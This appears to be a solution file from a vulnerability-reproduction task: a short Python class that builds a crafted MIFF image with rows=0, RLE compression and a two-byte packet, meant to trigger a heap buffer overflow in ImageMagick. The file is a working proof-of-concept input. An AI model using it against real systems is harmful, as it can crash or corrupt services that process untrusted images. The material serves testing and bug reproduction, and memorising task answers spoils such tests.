import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow
        in ImageMagick's MIFF image parser (oss-fuzz:42536646).

        The vulnerability occurs when parsing a MIFF (Magick Image File Format)
        image with its height (`rows`) set to 0. The library allocates a
        pixel buffer based on the dimensions (width * height), resulting in a
        zero-sized or minimal buffer. When the image is also RLE-compressed,
        the decoder attempts to decompress and write data into this tiny
        buffer, causing a heap buffer overflow.

        This PoC constructs a minimal MIFF file with these properties:
        1. A text header specifying `rows=0`.
        2. The compression type is set to `RLE`.
        3. A small, 2-byte RLE payload (`\x7f\x00`) is appended. This packet
           instructs the decoder to write 128 bytes, which overflows the
           buffer and triggers the vulnerability.
        """

        header_lines = [
            b'id=ImageMagick',
            b'class=DirectClass',
            b'depth=8',
            b'compression=RLE',
            b'columns=1',
            b'rows=0'
        ]
        header = b'\n'.join(header_lines)

        # The MIFF header is terminated by a specific sequence found in the
        # original fuzzer-minimized PoC (form-feed, newline, colon, newline).
        terminator = b'\x0c\n:\n'

        # A minimal RLE (Run-Length Encoded) data payload to cause the overflow.
        # The packet b'\x7f\x00' instructs the decoder to write 128 bytes of
        # the value 0, sufficient to overflow the small destination buffer.
        rle_data = b'\x7f\x00'

        poc_bytes = header + terminator + rle_data
        
        return poc_bytes